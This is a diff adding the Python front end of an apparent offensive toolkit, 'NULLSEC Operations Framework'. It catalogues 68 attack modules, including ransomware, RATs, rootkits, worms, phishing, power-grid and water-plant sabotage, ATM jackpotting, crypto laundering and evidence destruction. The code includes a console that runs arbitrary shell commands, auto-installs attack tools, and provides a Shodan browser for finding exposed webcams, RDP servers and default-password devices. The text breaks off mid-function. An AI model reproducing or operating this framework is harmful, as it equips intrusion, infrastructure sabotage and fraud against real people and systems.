@@ -1,0 +1,1565 @@
+#!/usr/bin/env python3
+"""
+NULLSEC Operations Framework
+Advanced Penetration Testing & Red Team Toolkit
+
+Developed by bad-antics development
+https://github.com/bad-antics
+"""
+
+import os
+import sys
+import subprocess
+import time
+import random
+import shutil
+import shlex
+import json
+
+# ANSI color codes
+class Colors:
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    RED = '\033[1;31m'
+    GREEN = '\033[1;32m'
+    YELLOW = '\033[1;33m'
+    BLUE = '\033[1;34m'
+    MAGENTA = '\033[1;35m'
+    CYAN = '\033[1;36m'
+    WHITE = '\033[1;37m'
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+
+# Attack modules
+MODULES = [
+    # Network Attacks (1-5)
+    {"id": 1, "name": "Network Intrusion", "icon": "🖥️", "script": "intrusion.sh", "desc": "Full penetration test chain", "category": "Network"},
+    {"id": 2, "name": "Port Scanner", "icon": "🔍", "script": "port-scanner.sh", "desc": "Advanced port enumeration", "category": "Network"},
+    {"id": 3, "name": "Man-in-the-Middle", "icon": "🕵️", "script": "mitm-attack.sh", "desc": "ARP spoofing & traffic intercept", "category": "Network"},
+    {"id": 4, "name": "DNS Poisoning", "icon": "☠️", "script": "dns-poison.sh", "desc": "DNS cache poisoning attack", "category": "Network"},
+    {"id": 5, "name": "VLAN Hopping", "icon": "🔀", "script": "vlan-hop.sh", "desc": "Switch exploitation & pivoting", "category": "Network"},
+    
+    # Wireless Attacks (6-10)
+    {"id": 6, "name": "WiFi Deauth", "icon": "📡", "script": "wifi-deauth.sh", "desc": "Deauthentication & evil twin", "category": "Wireless"},
+    {"id": 7, "name": "Bluetooth Warfare", "icon": "🦷", "script": "bluetooth-attack.sh", "desc": "BLE spam & device exploits", "category": "Wireless"},
+    {"id": 8, "name": "RFID Cloner", "icon": "💳", "script": "rfid-clone.sh", "desc": "Access card cloning ops", "category": "Wireless"},
+    {"id": 9, "name": "RF Jamming", "icon": "📻", "script": "rf-jammer.sh", "desc": "Radio frequency disruption", "category": "Wireless"},
+    {"id": 10, "name": "Zigbee Attack", "icon": "🏠", "script": "zigbee-attack.sh", "desc": "IoT smart home exploitation", "category": "Wireless"},
+    
+    # Web Attacks (11-16)
+    {"id": 11, "name": "SQL Injection", "icon": "🗄️", "script": "database-exfil.sh", "desc": "SQLi & database exfiltration", "category": "Web"},
+    {"id": 12, "name": "XSS Exploiter", "icon": "��", "script": "xss-attack.sh", "desc": "Cross-site scripting attacks", "category": "Web"},
+    {"id": 13, "name": "Web Shell Deploy", "icon": "🐚", "script": "webshell.sh", "desc": "Backdoor web shell injection", "category": "Web"},
+    {"id": 14, "name": "Directory Bruteforce", "icon": "📂", "script": "dir-bruteforce.sh", "desc": "Hidden directory discovery", "category": "Web"},
+    {"id": 15, "name": "API Exploitation", "icon": "🔌", "script": "api-exploit.sh", "desc": "REST/GraphQL API attacks", "category": "Web"},
+    {"id": 16, "name": "Session Hijacking", "icon": "🍪", "script": "session-hijack.sh", "desc": "Cookie theft & session takeover", "category": "Web"},
+    
+    # Malware Operations (17-23)
+    {"id": 17, "name": "Ransomware Deploy", "icon": "🔒", "script": "ransomware.sh", "desc": "Encryption & extortion chain", "category": "Malware"},
+    {"id": 18, "name": "Cryptominer Botnet", "icon": "⛏️", "script": "cryptominer.sh", "desc": "Mass cryptojacking operation", "category": "Malware"},
+    {"id": 19, "name": "RAT Deployment", "icon": "🐀", "script": "rat-deploy.sh", "desc": "Remote access trojan install", "category": "Malware"},
+    {"id": 20, "name": "Rootkit Installer", "icon": "👻", "script": "rootkit.sh", "desc": "Kernel-level persistence", "category": "Malware"},
+    {"id": 21, "name": "Keylogger Deploy", "icon": "⌨️", "script": "keylogger.sh", "desc": "Keystroke capture & exfil", "category": "Malware"},
+    {"id": 22, "name": "Worm Propagation", "icon": "🪱", "script": "worm.sh", "desc": "Self-replicating malware", "category": "Malware"},
+    {"id": 23, "name": "Fileless Malware", "icon": "💨", "script": "fileless.sh", "desc": "Memory-only persistence", "category": "Malware"},
+    
+    # Social Engineering (24-28)
+    {"id": 24, "name": "Phishing Campaign", "icon": "🎭", "script": "social-engineering.sh", "desc": "Spear phishing & credential harvest", "category": "Social"},
+    {"id": 25, "name": "Vishing Attack", "icon": "📞", "script": "vishing.sh", "desc": "Voice phishing operation", "category": "Social"},
+    {"id": 26, "name": "Smishing Campaign", "icon": "📱", "script": "smishing.sh", "desc": "SMS phishing mass deploy", "category": "Social"},
+    {"id": 27, "name": "Watering Hole", "icon": "🕳️", "script": "watering-hole.sh", "desc": "Targeted website compromise", "category": "Social"},
+    {"id": 28, "name": "Pretexting", "icon": "��", "script": "pretexting.sh", "desc": "Identity impersonation attack", "category": "Social"},
+    
+    # Advanced Attacks (29-34)
+    {"id": 29, "name": "APT Kill Chain", "icon": "💀", "script": "apt-attack.sh", "desc": "Nation-state level attack", "category": "Advanced"},
+    {"id": 30, "name": "Zero-Day Exploit", "icon": "🔥", "script": "zero-day.sh", "desc": "0-day exploitation chain", "category": "Advanced"},
+    {"id": 31, "name": "Supply Chain Attack", "icon": "📦", "script": "supply-chain.sh", "desc": "Software supply chain compromise", "category": "Advanced"},
+    {"id": 32, "name": "Firmware Backdoor", "icon": "🔌", "script": "firmware-backdoor.sh", "desc": "Hardware-level persistence", "category": "Advanced"},
+    {"id": 33, "name": "AI Model Poisoning", "icon": "🤖", "script": "ai-poison.sh", "desc": "ML model manipulation", "category": "Advanced"},
+    {"id": 34, "name": "Satellite Hack", "icon": "🛰️", "script": "satellite-hack.sh", "desc": "Space infrastructure attack", "category": "Advanced"},
+    
+    # Credential Attacks (35-39)
+    {"id": 35, "name": "Password Cracker", "icon": "🔐", "script": "password-crack.sh", "desc": "Hash cracking & brute force", "category": "Credentials"},
+    {"id": 36, "name": "Credential Stuffing", "icon": "📋", "script": "cred-stuff.sh", "desc": "Mass login attempts", "category": "Credentials"},
+    {"id": 37, "name": "Kerberoasting", "icon": "🎫", "script": "kerberoast.sh", "desc": "AD service ticket attack", "category": "Credentials"},
+    {"id": 38, "name": "Pass-the-Hash", "icon": "🔑", "script": "pass-hash.sh", "desc": "NTLM hash relay attack", "category": "Credentials"},
+    {"id": 39, "name": "Golden Ticket", "icon": "🎟️", "script": "golden-ticket.sh", "desc": "Kerberos TGT forgery", "category": "Credentials"},
+    
+    # Infrastructure (40-44)
+    {"id": 40, "name": "C2 Server", "icon": "🌐", "script": "c2-server.sh", "desc": "Command & control infrastructure", "category": "Infrastructure"},
+    {"id": 41, "name": "Proxy Chains", "icon": "🔗", "script": "proxy-chain.sh", "desc": "Multi-hop anonymization", "category": "Infrastructure"},
+    {"id": 42, "name": "VPN Tunneling", "icon": "🚇", "script": "vpn-tunnel.sh", "desc": "Encrypted tunnel creation", "category": "Infrastructure"},
+    {"id": 43, "name": "Tor Hidden Service", "icon": "🧅", "script": "tor-service.sh", "desc": "Onion service deployment", "category": "Infrastructure"},
+    {"id": 44, "name": "Fast Flux DNS", "icon": "⚡", "script": "fast-flux.sh", "desc": "Rapidly changing DNS records", "category": "Infrastructure"},
+    
+    # Physical Security (45-49)
+    {"id": 45, "name": "Physical Bypass", "icon": "🔓", "script": "physical-bypass.sh", "desc": "Lock & access control bypass", "category": "Physical"},
+    {"id": 46, "name": "BadUSB Attack", "icon": "💾", "script": "badusb.sh", "desc": "Rubber ducky payload deploy", "category": "Physical"},
+    {"id": 47, "name": "Camera Hijack", "icon": "📹", "script": "camera-hijack.sh", "desc": "CCTV & webcam takeover", "category": "Physical"},
+    {"id": 48, "name": "Alarm System Bypass", "icon": "🚨", "script": "alarm-bypass.sh", "desc": "Security system defeat", "category": "Physical"},
+    {"id": 49, "name": "ATM Jackpotting", "icon": "🏧", "script": "atm-jackpot.sh", "desc": "Cash machine exploitation", "category": "Physical"},
+    
+    # OPSEC & Dark Web (50-54)
+    {"id": 50, "name": "Dark Web Ops", "icon": "🧅", "script": "darkweb-ops.sh", "desc": "TOR marketplace operations", "category": "OPSEC"},
+    {"id": 51, "name": "Crypto Laundering", "icon": "💰", "script": "crypto-launder.sh", "desc": "Cryptocurrency mixing & wash", "category": "OPSEC"},
+    {"id": 52, "name": "Identity Forge", "icon": "🎭", "script": "identity-forge.sh", "desc": "Fake identity generation", "category": "OPSEC"},
+    {"id": 53, "name": "Evidence Destruction", "icon": "🔥", "script": "evidence-destroy.sh", "desc": "Log wiping & anti-forensics", "category": "OPSEC"},
+    {"id": 54, "name": "Steganography", "icon": "🖼️", "script": "stego.sh", "desc": "Hidden data in media files", "category": "OPSEC"},
+    
+    # DDoS & Disruption (55-58)
+    {"id": 55, "name": "DDoS Attack", "icon": "💥", "script": "ddos.sh", "desc": "Distributed denial of service", "category": "DDoS"},
+    {"id": 56, "name": "Slowloris", "icon": "🐢", "script": "slowloris.sh", "desc": "Low-bandwidth DoS attack", "category": "DDoS"},
+    {"id": 57, "name": "DNS Amplification", "icon": "📡", "script": "dns-amplify.sh", "desc": "Amplified reflection attack", "category": "DDoS"},
+    {"id": 58, "name": "Memcached Attack", "icon": "💾", "script": "memcached.sh", "desc": "UDP amplification flood", "category": "DDoS"},
+    
+    # ICS/SCADA (59-62)
+    {"id": 59, "name": "SCADA Exploit", "icon": "🏭", "script": "scada-exploit.sh", "desc": "Industrial control system attack", "category": "ICS"},
+    {"id": 60, "name": "PLC Manipulation", "icon": "🔧", "script": "plc-attack.sh", "desc": "Programmable logic controller hack", "category": "ICS"},
+    {"id": 61, "name": "Power Grid Attack", "icon": "⚡", "script": "power-grid.sh", "desc": "Electrical infrastructure sabotage", "category": "ICS"},
+    {"id": 62, "name": "Water System Hack", "icon": "💧", "script": "water-system.sh", "desc": "Water treatment plant exploit", "category": "ICS"},
+    
+    # Advanced Exploitation (63-68)
+    {"id": 63, "name": "DNS Tunneling", "icon": "🌐", "script": "dns-tunnel.sh", "desc": "Data exfiltration via DNS", "category": "Advanced"},
+    {"id": 64, "name": "Process Injection", "icon": "💉", "script": "process-injection.sh", "desc": "In-memory code execution", "category": "Advanced"},
+    {"id": 65, "name": "Lateral Movement", "icon": "🔀", "script": "lateral-movement.sh", "desc": "Network pivoting techniques", "category": "Network"},
+    {"id": 66, "name": "Token Impersonation", "icon": "🎫", "script": "token-impersonate.sh", "desc": "Privilege escalation via tokens", "category": "Credentials"},
+    {"id": 67, "name": "Memory Exploitation", "icon": "💾", "script": "memory-exploit.sh", "desc": "Buffer overflow & heap attacks", "category": "Advanced"},
+    {"id": 68, "name": "Persistence", "icon": "🔒", "script": "persistence.sh", "desc": "Backdoor persistence mechanisms", "category": "Malware"},
+]
+
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+ATTACK_DIR = os.path.join(SCRIPT_DIR, "nullsecurity")
+
+# Command execution history
+COMMAND_HISTORY = []
+
+def check_command_exists(command):
+    """Check if a command exists in PATH"""
+    return shutil.which(command) is not None
+
+def install_package(package_name, installer='apt'):
+    """Offer to install a missing package"""
+    print(f"\n{Colors.YELLOW}[!] {package_name} is not installed{Colors.RESET}")
+    print(f"{Colors.CYAN}[?] Would you like to install it? (y/n):{Colors.RESET} ", end='')
+    choice = input().strip().lower()
+    
+    if choice == 'y':
+        print(f"\n{Colors.GREEN}[*] Installing {package_name}...{Colors.RESET}")
+        
+        if installer == 'apt':
+            subprocess.run(['sudo', 'apt', 'update'], check=False)
+            result = subprocess.run(['sudo', 'apt', 'install', '-y', package_name], check=False)
+        elif installer == 'pip':
+            result = subprocess.run(['pip3', 'install', package_name], check=False)
+        elif installer == 'pip3':
+            result = subprocess.run(['pip3', 'install', package_name], check=False)
+        elif installer == 'npm':
+            result = subprocess.run(['sudo', 'npm', 'install', '-g', package_name], check=False)
+        elif installer == 'snap':
+            result = subprocess.run(['sudo', 'snap', 'install', package_name], check=False)
+        else:
+            result = subprocess.run(['sudo', installer, 'install', '-y', package_name], check=False)
+        
+        if result.returncode == 0:
+            print(f"{Colors.GREEN}[✓] {package_name} installed successfully{Colors.RESET}")
+            return True
+        else:
+            print(f"{Colors.RED}[✗] Installation failed{Colors.RESET}")
+            return False
+    return False
+
+def execute_external_command(command, description="Executing command"):
+    """Execute external command with dependency checking"""
+    print(f"\n{Colors.CYAN}[*] {description}{Colors.RESET}")
+    print(f"{Colors.DIM}Command: {command}{Colors.RESET}\n")
+    
+    # Parse command to check first binary
+    try:
+        parts = shlex.split(command)
+        if not parts:
+            print(f"{Colors.RED}[!] Empty command{Colors.RESET}")
+            return False
+        
+        main_cmd = parts[0]
+        
+        # Check if command exists
+        if not check_command_exists(main_cmd):
+            print(f"{Colors.YELLOW}[!] '{main_cmd}' not found in system{Colors.RESET}")
+            
+            # Common package mappings
+            package_map = {
+                'nmap': ('nmap', 'apt'),
+                'wireshark': ('wireshark', 'apt'),
+                'aircrack-ng': ('aircrack-ng', 'apt'),
+                'hashcat': ('hashcat', 'apt'),
+                'hydra': ('hydra', 'apt'),
+                'john': ('john', 'apt'),
+                'metasploit': ('metasploit-framework', 'apt'),
+                'msfconsole': ('metasploit-framework', 'apt'),
+                'ettercap': ('ettercap-text-only', 'apt'),
+                'sqlmap': ('sqlmap', 'apt'),
+                'nikto': ('nikto', 'apt'),
+                'dirb': ('dirb', 'apt'),
+                'gobuster': ('gobuster', 'apt'),
+                'ffuf': ('ffuf', 'apt'),
+                'burpsuite': ('burpsuite', 'apt'),
+                'zaproxy': ('zaproxy', 'apt'),
+                'ghidra': ('ghidra', 'apt'),
+                'netcat': ('netcat-traditional', 'apt'),
+                'nc': ('netcat-traditional', 'apt'),
+                'socat': ('socat', 'apt'),
+                'tcpdump': ('tcpdump', 'apt'),
+                'tshark': ('tshark', 'apt'),
+                'python3': ('python3', 'apt'),
+                'python': ('python3', 'apt'),
+                'perl': ('perl', 'apt'),
+                'ruby': ('ruby', 'apt'),
+                'npm': ('npm', 'apt'),
+                'git': ('git', 'apt'),
+                'curl': ('curl', 'apt'),
+                'wget': ('wget', 'apt'),
+                'jq': ('jq', 'apt'),
+                'yq': ('yq', 'snap'),
+            }
+            
+            if main_cmd in package_map:
+                pkg_name, installer = package_map[main_cmd]
+                if install_package(pkg_name, installer):
+                    # Recheck after installation
+                    if not check_command_exists(main_cmd):
+                        print(f"{Colors.RED}[!] Command still not available after installation{Colors.RESET}")
+                        return False
+                else:
+                    return False
+            else:
+                print(f"{Colors.YELLOW}[?] Try installing manually or specify package name{Colors.RESET}")
+                print(f"{Colors.CYAN}[?] Package name (or ENTER to skip):{Colors.RESET} ", end='')
+                pkg = input().strip()
+                if pkg:
+                    print(f"{Colors.CYAN}[?] Installer (apt/pip/npm/snap) [apt]:{Colors.RESET} ", end='')
+                    inst = input().strip() or 'apt'
+                    if install_package(pkg, inst):
+                        if not check_command_exists(main_cmd):
+                            print(f"{Colors.YELLOW}[*] Continuing anyway...{Colors.RESET}")
+                    else:
+                        return False
+                else:
+                    return False
+        
+        # Execute command
+        COMMAND_HISTORY.append(command)
+        result = subprocess.run(command, shell=True, check=False)
+        
+        if result.returncode == 0:
+            print(f"\n{Colors.GREEN}[✓] Command completed successfully{Colors.RESET}")
+            return True
+        else:
+            print(f"\n{Colors.YELLOW}[!] Command exited with code {result.returncode}{Colors.RESET}")
+            return False
+            
+    except Exception as e:
+        print(f"{Colors.RED}[!] Error executing command: {e}{Colors.RESET}")
+        return False
+
+def run_external_script(script_path):
+    """Run external script with automatic interpreter detection"""
+    if not os.path.exists(script_path):
+        print(f"{Colors.RED}[!] Script not found: {script_path}{Colors.RESET}")
+        return False
+    
+    print(f"\n{Colors.CYAN}[*] Running external script: {os.path.basename(script_path)}{Colors.RESET}")
+    
+    # Make executable if not already
+    os.chmod(script_path, 0o755)
+    
+    # Detect script type
+    _, ext = os.path.splitext(script_path)
+    
+    if ext == '.sh':
+        interpreter = 'bash'
+    elif ext == '.py':
+        interpreter = 'python3'
+    elif ext == '.pl':
+        interpreter = 'perl'
+    elif ext == '.rb':
+        interpreter = 'ruby'
+    elif ext == '.js':
+        interpreter = 'node'
+    else:
+        # Try to run directly
+        interpreter = None
+    
+    # Check for shebang
+    try:
+        with open(script_path, 'r') as f:
+            first_line = f.readline().strip()
+            if first_line.startswith('#!'):
+                # Has shebang, run directly
+                result = subprocess.run([script_path], check=False)
+                return result.returncode == 0
+    except:
+        pass
+    
+    # Run with interpreter
+    if interpreter:
+        if not check_command_exists(interpreter):
+            print(f"{Colors.YELLOW}[!] {interpreter} not found{Colors.RESET}")
+            if install_package(interpreter, 'apt'):
+                pass
+            else:
+                return False
+        
+        COMMAND_HISTORY.append(f"{interpreter} {script_path}")
+        result = subprocess.run([interpreter, script_path], check=False)
+        
+        if result.returncode == 0:
+            print(f"\n{Colors.GREEN}[✓] Script completed successfully{Colors.RESET}")
+            return True
+        else:
+            print(f"\n{Colors.YELLOW}[!] Script exited with code {result.returncode}{Colors.RESET}")
+            return False
+    else:
+        # Try direct execution
+        COMMAND_HISTORY.append(script_path)
+        result = subprocess.run([script_path], check=False)
+        return result.returncode == 0
+
+def command_console():
+    """Interactive command execution console"""
+    clear_screen()
+    print(f"""
+{Colors.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+█{Colors.WHITE}                      NULLSEC COMMAND CONSOLE{Colors.CYAN}                        █
+█{Colors.DIM}               Execute Any Script or Application{Colors.CYAN}                     █
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+
+{Colors.YELLOW}Features:{Colors.RESET}
+  • Execute any shell command
+  • Run external scripts (.sh, .py, .pl, .rb, .js)
+  • Automatic dependency checking
+  • Install missing tools on-demand
+  • Command history tracking
+
+{Colors.YELLOW}Commands:{Colors.RESET}
+  {Colors.GREEN}exec <command>{Colors.RESET}    - Execute shell command
+  {Colors.GREEN}run <script>{Colors.RESET}      - Run external script (absolute or relative path)
+  {Colors.GREEN}install <pkg>{Colors.RESET}     - Install package via apt/pip/npm
+  {Colors.GREEN}check <cmd>{Colors.RESET}       - Check if command is available
+  {Colors.GREEN}shodan{Colors.RESET}            - Launch Shodan intelligence browser
+  {Colors.GREEN}history{Colors.RESET}           - Show command history
+  {Colors.GREEN}clear{Colors.RESET}             - Clear screen
+  {Colors.GREEN}help{Colors.RESET}              - Show this help
+  {Colors.GREEN}exit{Colors.RESET}              - Return to main menu
+
+{Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+""")
+    
+    while True:
+        try:
+            cmd = input(f"{Colors.RED}nullsec{Colors.DIM}@{Colors.CYAN}exec{Colors.RESET} > ").strip()
+            
+            if not cmd:
+                continue
+            
+            if cmd == 'exit':
+                break
+            elif cmd == 'help':
+                print(f"""
+{Colors.YELLOW}Available Commands:{Colors.RESET}
+  {Colors.GREEN}exec{Colors.RESET} <command>     - Execute any shell command
+  {Colors.GREEN}run{Colors.RESET} <script>       - Run script file (auto-detects interpreter)
+  {Colors.GREEN}install{Colors.RESET} <package>  - Install package (apt/pip/npm)
+  {Colors.GREEN}check{Colors.RESET} <command>    - Check if command exists
+  {Colors.GREEN}shodan{Colors.RESET}             - Launch Shodan intelligence browser
+  {Colors.GREEN}history{Colors.RESET}            - Show command history
+  {Colors.GREEN}clear{Colors.RESET}              - Clear screen
+  {Colors.GREEN}exit{Colors.RESET}               - Return to main menu
+
+{Colors.YELLOW}Examples:{Colors.RESET}
+  exec nmap -sV 192.168.1.1
+  run /tmp/exploit.py
+  run ./custom-script.sh
+  install metasploit-framework
+  check wireshark
+  shodan
+""")
+            elif cmd == 'clear':
+                clear_screen()
+            elif cmd == 'shodan':
+                shodan_browser()
+            elif cmd == 'history':
+                if COMMAND_HISTORY:
+                    print(f"\n{Colors.CYAN}Command History:{Colors.RESET}")
+                    for i, h_cmd in enumerate(COMMAND_HISTORY[-20:], 1):
+                        print(f"  {Colors.DIM}{i}.{Colors.RESET} {h_cmd}")
+                else:
+                    print(f"{Colors.YELLOW}[*] No command history{Colors.RESET}")
+            elif cmd.startswith('exec '):
+                command = cmd[5:].strip()
+                if command:
+                    execute_external_command(command)
+                    print(f"\n{Colors.DIM}Press ENTER to continue...{Colors.RESET}")
+                    input()
+                else:
+                    print(f"{Colors.RED}[!] No command specified{Colors.RESET}")
+            elif cmd.startswith('run '):
+                script = cmd[4:].strip()
+                if script:
+                    # Handle relative paths
+                    if not os.path.isabs(script):
+                        script = os.path.join(os.getcwd(), script)
+                    run_external_script(script)
+                    print(f"\n{Colors.DIM}Press ENTER to continue...{Colors.RESET}")
+                    input()
+                else:
+                    print(f"{Colors.RED}[!] No script specified{Colors.RESET}")
+            elif cmd.startswith('install '):
+                parts = cmd.split()
+                if len(parts) >= 2:
+                    package = parts[1]
+                    installer = parts[2] if len(parts) > 2 else 'apt'
+                    install_package(package, installer)
+                else:
+                    print(f"{Colors.RED}[!] Usage: install <package> [apt|pip|npm|snap]{Colors.RESET}")
+            elif cmd.startswith('check '):
+                command = cmd[6:].strip()
+                if command:
+                    if check_command_exists(command):
+                        path = shutil.which(command)
+                        print(f"{Colors.GREEN}[✓] {command} is installed: {path}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[✗] {command} not found{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[!] No command specified{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}[!] Unknown command. Type 'help' for available commands{Colors.RESET}")
+        
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[*] Use 'exit' to return to main menu{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+    
+    print(f"{Colors.GREEN}[*] Returning to main menu{Colors.RESET}")
+    time.sleep(0.5)
+
+def shodan_browser():
+    """Interactive Shodan search browser within console"""
+    clear_screen()
+    print(f"""
+{Colors.BLUE}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+█{Colors.WHITE}                      SHODAN INTELLIGENCE BROWSER{Colors.BLUE}                    █
+█{Colors.DIM}                   live-Time Internet Device Search{Colors.BLUE}                  █
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+
+{Colors.YELLOW}Search Types:{Colors.RESET}
+  {Colors.GREEN}search <query>{Colors.RESET}      - Search Shodan (e.g., "apache", "port:22")
+  {Colors.GREEN}host <ip>{Colors.RESET}           - Get detailed host information
+  {Colors.GREEN}count <query>{Colors.RESET}       - Count results for query
+  {Colors.GREEN}exploits <query>{Colors.RESET}    - Search for exploits
+  {Colors.GREEN}myip{Colors.RESET}                - Get your public IP info
+  {Colors.GREEN}stats <query>{Colors.RESET}       - Get statistics for search
+
+{Colors.YELLOW}Actions:{Colors.RESET}
+  {Colors.GREEN}save <filename>{Colors.RESET}     - Save last results to file
+  {Colors.GREEN}export <ip>{Colors.RESET}         - Export IP to target file
+  {Colors.GREEN}scan <ip>{Colors.RESET}           - Quick nmap scan on result
+
+{Colors.YELLOW}Navigation:{Colors.RESET}
+  {Colors.GREEN}help{Colors.RESET}                - Show this help
+  {Colors.GREEN}clear{Colors.RESET}               - Clear screen
+  {Colors.GREEN}exit{Colors.RESET}                - Return to command console
+
+{Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+""")
+    
+    # Load API keys
+    shodan_script = os.path.join(SCRIPT_DIR, "nullsecurity", "shodan-search.sh")
+    api_keys = []
+    if os.path.exists(shodan_script):
+        with open(shodan_script, 'r') as f:
+            in_keys_section = False
+            for line in f:
+                if 'API_KEYS=(' in line:
+                    in_keys_section = True
+                    continue
+                if in_keys_section:
+                    if ')' in line:
+                        break
+                    if '"' in line:
+                        key = line.strip().strip('"').strip(',').strip('"')
+                        if key and len(key) > 20:
+                            api_keys.append(key)
+    
+    if not api_keys:
+        print(f"{Colors.YELLOW}[!] No Shodan API keys found. Using limited mode.{Colors.RESET}\n")
+        api_key = None
+    else:
+        api_key = api_keys[0]
+        print(f"{Colors.GREEN}[✓] Shodan API ready ({len(api_keys)} keys available){Colors.RESET}\n")
+    
+    last_results = []
+    
+    while True:
+        try:
+            cmd = input(f"{Colors.BLUE}shodan{Colors.DIM}@{Colors.CYAN}browser{Colors.RESET} > ").strip()
+            
+            if not cmd:
+                continue
+            
+            if cmd == 'exit':
+                break
+            elif cmd == 'help':
+                print(f"""
+{Colors.YELLOW}Shodan Browser Commands:{Colors.RESET}
+
+{Colors.GREEN}Search:{Colors.RESET}
+  search apache country:US        - Search for Apache servers in US
+  search product:MySQL            - Search for MySQL databases
+  search port:22                  - Search for SSH servers
+  search webcam                   - Search for webcams
+  host 8.8.8.8                    - Get info about specific IP
+  count port:3389                 - Count RDP servers
+  exploits apache 2.4             - Find exploits for Apache 2.4
+  myip                            - Get your IP information
+  stats port:80                   - Get statistics for port 80
+
+{Colors.GREEN}Actions:{Colors.RESET}
+  save results.json               - Save results to JSON file
+  export 192.168.1.1              - Export IP to .shodan_target
+  scan 192.168.1.1                - Quick nmap scan
+
+{Colors.YELLOW}Search Examples:{Colors.RESET}
+  search cisco country:CN
+  search "default password" country:FR
+  search port:445 country:RU
+  search product:MongoDB
+  search org:"Amazon"
+  search ssl:"self signed"
+""")
+            elif cmd == 'clear':
+                clear_screen()
+            elif cmd == 'myip':
+                if not api_key:
+                    print(f"{Colors.RED}[!] Shodan API key required{Colors.RESET}")
+                    continue
+                
+                print(f"\n{Colors.CYAN}[*] Fetching your IP information...{Colors.RESET}")
+                result = subprocess.run(
+                    ['curl', '-s', f'https://api.shodan.io/tools/myip?key={api_key}'],
+                    capture_output=True, text=True, timeout=10
+                )
+                
+                if result.returncode == 0 and result.stdout:
+                    ip = result.stdout.strip().strip('"')
+                    print(f"{Colors.GREEN}[✓] Your Public IP: {Colors.WHITE}{ip}{Colors.RESET}")
+                    
+                    # Get host info
+                    result2 = subprocess.run(
+                        ['curl', '-s', f'https://api.shodan.io/shodan/host/{ip}?key={api_key}'],
+                        capture_output=True, text=True, timeout=10
+                    )
+                    
+                    if result2.returncode == 0 and result2.stdout:
+                        try:
+                            data = json.loads(result2.stdout)
+                            print(f"    {Colors.DIM}Country: {data.get('country_name', 'N/A')}{Colors.RESET}")
+                            print(f"    {Colors.DIM}City: {data.get('city', 'N/A')}{Colors.RESET}")
+                            print(f"    {Colors.DIM}ISP: {data.get('isp', 'N/A')}{Colors.RESET}")
+                            print(f"    {Colors.DIM}Org: {data.get('org', 'N/A')}{Colors.RESET}")
+                            if 'ports' in data:
+                                print(f"    {Colors.DIM}Open Ports: {', '.join(map(str, data['ports']))}{Colors.RESET}")
+                        except:
+                            pass
+                else:
+                    print(f"{Colors.RED}[!] Failed to fetch IP info{Colors.RESET}")
+                    
+            elif cmd.startswith('search '):
+                query = cmd[7:].strip()
+                if not query:
+                    print(f"{Colors.RED}[!] No search query specified{Colors.RESET}")
+                    continue
+                
+                if not api_key:
+                    print(f"{Colors.RED}[!] Shodan API key required for searches{Colors.RESET}")
+                    continue
+                
+                print(f"\n{Colors.CYAN}[*] Searching Shodan for: {Colors.WHITE}{query}{Colors.RESET}")
+                result = subprocess.run(
+                    ['curl', '-s', f'https://api.shodan.io/shodan/host/search?key={api_key}&query={query}'],
+                    capture_output=True, text=True, timeout=30
+                )
+                
+                if result.returncode == 0 and result.stdout:
+                    try:
+                        data = json.loads(result.stdout)
+                        
+                        if 'matches' in data:
+                            matches = data['matches']
+                            total = data.get('total', len(matches))
+                            
+                            print(f"{Colors.GREEN}[✓] Found {total} results (showing first {len(matches)}){Colors.RESET}\n")
+                            
+                            last_results = []
+                            for i, match in enumerate(matches[:10], 1):
+                                ip = match.get('ip_str', 'N/A')
+                                port = match.get('port', 'N/A')
+                                org = match.get('org', 'Unknown')
+                                country = match.get('location', {}).get('country_code', 'N/A')
+                                product = match.get('product', '')
+                                version = match.get('version', '')
+                                
+                                last_results.append(ip)
+                                
+                                print(f"  {Colors.YELLOW}[{i}]{Colors.RESET} {Colors.WHITE}{ip}:{port}{Colors.RESET}")
+                                print(f"      {Colors.DIM}Country: {country} | Org: {org}{Colors.RESET}")
+                                if product:
+                                    print(f"      {Colors.DIM}Product: {product} {version}{Colors.RESET}")
+                                
+                                # Show banner preview
+                                banner = match.get('data', '')
+                                if banner:
+                                    preview = banner[:100].replace('\n', ' ').strip()
+                                    print(f"      {Colors.DIM}Banner: {preview}...{Colors.RESET}")
+                                print()
+                        else:
+                            print(f"{Colors.YELLOW}[*] No results found{Colors.RESET}")
+                    
+                    except json.JSONDecodeError:
+                        print(f"{Colors.RED}[!] Invalid response from Shodan{Colors.RESET}")
